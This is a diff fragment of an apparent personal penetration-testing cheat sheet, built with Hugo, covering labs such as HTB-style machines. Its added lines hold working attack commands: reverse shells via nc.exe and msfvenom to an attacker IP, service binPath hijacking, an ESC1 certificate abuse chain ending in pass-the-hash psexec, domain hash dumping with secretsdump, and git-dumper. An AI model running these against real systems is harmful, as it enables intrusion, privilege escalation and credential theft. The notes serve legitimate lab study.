+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump MARVEL.local/hawkeye:<span style="color:#e6db74">&#39;Password1&#39;</span>@$DC -just-dc-ntlm</span></span></code></pre></div>
 <h3 id="impacket-net">impacket-net<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <p><em>Prepare vaild domain credentials</em></p>
 <p><a href="https://www.hackingarticles.in/impacket-for-pentester-net/" rel="external">All detailed reference</a></p>
 <ul>
 <li>user enum</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/raj:Password@192.168.1.8 user</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/raj:Password@192.168.1.8 user</span></span></code></pre></div>
 <ul>
 <li>user details</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/raj:Password@192.168.1.8 user -name sanjeet</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/raj:Password@192.168.1.8 user -name sanjeet</span></span></code></pre></div>
 <ul>
 <li>create domain user</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav -newPasswd Password@987</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/administrator:Ignite@192.168.1.8 user -create anubhav -newPasswd Password@987</span></span></code></pre></div>
 <ul>
 <li>enum via kerberos ticket</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-net ignite.local/administrator@dc.ignite.local -k -no-pass user</span></span></code></pre></div>
 <h2 id="smb">SMB<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <h3 id="smbpasswd">smbpasswd<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <ul>
 <li>when SMB error message says &ldquo;user must change password&rdquo;</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbpasswd -r 192.168.121.123 -U testuser
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>smbpasswd -r 192.168.121.123 -U testuser
 </span></span><span style="display:flex;"><span>Old SMB password:
 </span></span><span style="display:flex;"><span>New SMB password:
 </span></span><span style="display:flex;"><span>Retype new SMB password:
@@ -497,18 +583,116 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <ul>
 <li>terminal oneliner</li>
 </ul>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\mysql.exe -uroot -e <span style="color:#e6db74">&#34;show databases;&#34;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>.\mysql.exe -uroot -e <span style="color:#e6db74">&#34;show databases;&#34;</span></span></span></code></pre></div>
 <h2 id="bloodhound">Bloodhound<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>Get domain information remotely.</p>
 <p>Domain user account needed.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all </span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns $DC -c all </span></span></code></pre></div>
 <h3 id="plumhound">plumhound<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
 <p>Automatically analyze the result of bloodhound and make a report for me.</p>
 <p>neo4j, bloodhound must be running.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>	1. Check neo4j, bloodhound are running
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>	1. Check neo4j, bloodhound are running
 </span></span><span style="display:flex;"><span>	2. sudo python3 PlumHound.py --easy -p <span style="color:#f92672">{</span>neo4j password<span style="color:#f92672">}</span>
-</span></span><span style="display:flex;"><span>	3. sudo python3 PlumHound.py -x tasks/default.tasks -p <span style="color:#f92672">{</span>neo4j password<span style="color:#f92672">}</span>  <span style="color:#f92672">(</span>write a report<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>cd reports </span></span></code></pre></div>
+</span></span><span style="display:flex;"><span>	3. sudo python3 PlumHound.py -x tasks/default.tasks -p <span style="color:#f92672">{</span>neo4j password<span style="color:#f92672">}</span>  <span style="color:#f92672">(</span>write a report<span style="color:#f92672">)</span></span></span></code></pre></div>
+<h2 id="git">git<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>git clone with authorized token</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.234.64:3000/ellen.freeman/website.git</code></pre></div>
+<h3 id="git-dumper">git-dumper<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<ul>
+<li>git-dumper dumps git repository to local.</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>pip install git-dumper</code></pre></div>
+<blockquote>
+<p>even browser access to <code>/.git</code> is forbidden, it can still dump the repository</p>
+</blockquote>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>git-dumper http://bullybox.local/.git/ bullybox/</code></pre></div>
+<h2 id="evilwin-rm">evilwin-rm<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li><code>services</code> : display running sc.exe services</li>
+<li><code>upload</code> : upload a file</li>
+<li><code>download</code> : download a file</li>
+</ul>
+<h2 id="runascs">runascs<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>run as other users in windows</li>
+<li>used for privesc</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>./RunasCs.exe admin Twisting3021 &#34;C:\temp\nc64.exe 10.10.14.61 1234 -e cmd.exe&#34; -bypass-uac</code></pre></div>
+<h2 id="privileged-groups">Privileged groups<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>check with <code>whoami /group</code></li>
+</ul>
+<h3 id="server-operator-group">server operator group<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<ol>
+<li>check running services. <code>services</code> command in case of evilwin-rm.</li>
+<li>create a rev shell file using msfvenom. <code>msfvenom -p windows/x64/shell_reverse_tcp -f exe -o rev.exe LHOST=10.10.15.99 LPORT=4444</code></li>
+<li>change the binary path of any target service. <code>sc.exe config VMTools binPath=&quot;C:\Users\svc-printer\Documents\rev.exe&quot;</code></li>
+<li>restart the service. <code>sc.exe stop VMTools</code> <code>sc.exe start VMTools</code></li>
+</ol>
+<p>or alternatively, in the step 3, execute nc.exe binary.</p>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>sc.exe config VMTools binPath=&#34;C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.15.99 4444&#34;</code></pre></div>
+<h2 id="certipy-ad">CERTIPY-AD<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>print out vulnerable certificate templates</li>
+</ul>
+<p><code>certipy-ad find -username 'BANKING$' -password 'Password1!' -dc-ip 10.129.2.242 -vulnerable -enable -stdout</code></p>
+<h3 id="esc1">ESC1<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h3>
+<p><a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation" rel="external">ESC1 certipy doc</a></p>
+<ol>
+<li>Enum the information of the target user</li>
+</ol>
+<p><code>certipy-ad account -u 'BANKING$' -p 'Password1!' -dc-ip '10.129.2.242' -user 'administrator' read</code></p>
+<ol start="2">
+<li>Request a certificate</li>
+</ol>
+<p><code>certipy-ad req -u 'BANKING$' -p 'Password1!' -dc-ip '10.129.2.242' -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'</code></p>
+<ul>
+<li>below error happens when the <strong>key-size</strong> is different</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code>[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
+Would you like to save the private key? (y/N)</code></pre></div>
+<ul>
+<li>in the case of key size error</li>
+</ul>
+<p><code>certipy-ad -debug req -u 'BANKING$@retro.vl' -p 'Password1!' -dc-ip '10.129.2.242' -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096</code></p>
+<ol start="3">
+<li>Authentication with the created certificate</li>
+</ol>
+<p><code>certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.129.2.242'</code></p>
+<ol start="4">
+<li>Access with the created hash</li>
+</ol>
+<p><code>impacket-psexec retro.vl/administrator@retro.vl -hashes :252fac7066d93dd009d4fd2cd0368389</code></p>
+<h2 id="sudo">sudo<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>check sudo privilege.</li>
+</ul>
+<p><code>sudo -l</code></p>
+<ul>
+<li>run sudo as other users</li>
+</ul>
+<p><code>sudo -u username</code></p>
+<h2 id="postgres">postgres<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>login</li>
+</ul>
+<p><code>psql -h 127.0.0.1 -d register_hetemit -U railsdev</code></p>
+<h2 id="systemd">systemd<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
+<ul>
+<li>
+<p>When there is a writable file in the <strong>systemd</strong> directory.</p>
+</li>
+<li>
+<p><a href="https://www.freedesktop.org/software/systemd/man/latest/systemd.service.html?__goaway_challenge=meta-refresh&__goaway_id=1f5d8f391920d4d10122aa7054693dec&__goaway_referer=https%3A%2F%2Fwww.google.com%2F" rel="external">document</a></p>
+</li>
+<li>
+<p>change to root user, add payload and reboot so that the script can be run</p>
+</li>
+</ul>
+<p><a href="#R-image-e08aba3b9613a0169d7f82e6bc3aa54c" class="lightbox-link"><img alt="systemd" class="lazy lightbox figure-image" loading="lazy" src="/images/hetemit/systemd.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-e08aba3b9613a0169d7f82e6bc3aa54c"><img alt="systemd" class="lazy lightbox lightbox-image" loading="lazy" src="/images/hetemit/systemd.png"></a></p>
 
   <footer class="footline">
               <i class='fa-fw fas fa-calendar'></i> Apr 28, 2026
@@ -610,8 +794,8 @@ AS-REP Roasting (user account) windows .\Rubeus.exe asreproast /nowrap /outfile:
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779778938" defer></script>
-    <script src="/js/theme.js?1779778938" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
+    <script src="/js/theme.js?1784855724" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
